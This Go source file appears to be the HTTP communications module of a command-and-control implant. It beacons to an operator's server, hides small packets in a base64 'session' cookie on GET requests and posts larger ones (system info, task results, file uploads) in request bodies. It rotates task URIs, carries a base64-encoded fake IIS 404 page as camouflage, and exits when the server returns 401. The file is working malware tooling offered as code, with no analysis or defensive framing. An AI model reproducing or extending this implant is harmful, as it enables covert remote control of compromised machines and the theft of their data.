package comms

import (
	"bytes"
	"encoding/base64"
	"errors"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
)

// legacyPostThresholdBytes is the size cutoff that picks GET vs POST for
// an outgoing routing packet. It mirrors the server-side heuristic in the
// malleable HTTP listener: small packets (session heartbeats / tasking
// polls) go through the "get" section where the metadata terminator stuffs
// them into a Cookie / header / query param; larger packets (sysinfo,
// task results, file uploads) go through the "post" section's body.
const legacyPostThresholdBytes = 20

// HttpMessageSender owns the outbound HTTP path for the agent. In the plain
// (non-malleable) build it only drives the legacy pipe-split path; when the
// `malleable` build tag is set, http_malleable.go populates `malleable` with
// a *MalleableProfile and trySendMalleable takes over. Keeping `malleable`
// as interface{} lets base-build code stay agnostic to the malleable types
// (which only exist in malleable-tagged files) while still allocating one
// pointer slot's worth of storage for them.
type HttpMessageSender struct {
	Headers         map[string]string
	Profile         string
	TaskURIs        []string
	DefaultResponse string
	Server          string
	MissedCheckins  int

	// Only populated when the `malleable` build tag is active — see
	// http_malleable.go. Declared as interface{} here so this file compiles
	// without the malleable types.
	malleable interface{}
}

// NewHttpMessageSender builds a sender from the raw template variables. Only
// drives the legacy pipe-split path; malleable builds use
// NewMalleableHttpMessageSender (http_malleable.go) instead.
func NewHttpMessageSender(server string, headers map[string]string, legacyProfile string) *HttpMessageSender {
	if strings.HasSuffix(server, "/") {
		server = server[:len(server)-1]
	}
	if !strings.HasPrefix(server, "http://") && !strings.HasPrefix(server, "https://") {
		server = "http://" + server
	}

	var taskURIs []string
	parts := strings.Split(legacyProfile, "|")
	if parts[0] != "" {
		taskURIs = strings.Split(parts[0], ",")
	}

	defaultResponse := "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg=="

	return &HttpMessageSender{
		Headers:         headers,
		Profile:         legacyProfile,
		TaskURIs:        taskURIs,
		DefaultResponse: defaultResponse,
		Server:          server,
		MissedCheckins:  0,
	}
}

// SendMessage wires the outbound routing packet. When the `malleable` build
// tag is set and a profile was attached, trySendMalleable (in
// http_malleable.go) takes over; otherwise we fall through to the legacy
// pipe-split cookie/body path.
func (sender *HttpMessageSender) SendMessage(routingPacket []byte) ([]byte, error) {
	if sender.Headers == nil {
		sender.Headers = make(map[string]string)
	}
	if handled, resp, err := sender.trySendMalleable(routingPacket); handled {
		return resp, err
	}
	return sender.sendLegacy(routingPacket)
}

// sendLegacy is the unchanged behavior from before the malleable refactor:
// pick a random URI from the pipe-split list, POST payloads >20 bytes and
// tuck smaller ones into a session= cookie on a GET.
func (sender *HttpMessageSender) sendLegacy(routingPacket []byte) ([]byte, error) {
	if len(sender.TaskURIs) == 0 {
		return []byte{}, nil
	}
	taskURI := sender.TaskURIs[rand.Intn(len(sender.TaskURIs))]
	requestURI := sender.Server + taskURI

	var req *http.Request
	var err error

	if len(routingPacket) > legacyPostThresholdBytes {
		req, err = http.NewRequest("POST", requestURI, bytes.NewReader(routingPacket))
	} else {
		b64RoutingPacket := base64.StdEncoding.EncodeToString(routingPacket)
		sender.Headers["Cookie"] = "session=" + b64RoutingPacket
		req, err = http.NewRequest("GET", requestURI, nil)
	}

	if err != nil {
		sender.MissedCheckins++
		return []byte{}, err
	}

	for k, v := range sender.Headers {
		req.Header.Set(k, v)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		sender.MissedCheckins++
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		sender.MissedCheckins++
		return nil, err
	}

	if resp.StatusCode == 200 {
		return body, nil
	}
	sender.MissedCheckins++
	if resp.StatusCode == 401 {
		os.Exit(0)
	}
	return nil, errors.New(strconv.Itoa(resp.StatusCode))
}
